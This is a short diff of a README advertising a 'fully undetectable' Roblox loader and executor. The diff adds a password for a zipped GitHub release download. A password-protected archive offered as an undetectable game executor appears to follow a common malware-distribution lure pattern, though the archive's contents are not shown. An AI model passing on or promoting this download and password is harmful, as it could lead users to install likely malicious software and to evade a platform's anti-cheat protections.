@@ -2,6 +2,7 @@
 Fully undetectable loader and excutor for roblox. 
 
 Download: https://github.com/sleepingmuffin/Roblox-Loader/releases/download/v1.0.2/Roblox-Loader.zip
+Password: robloxloader
 
 # Features
 + Fully undetectable
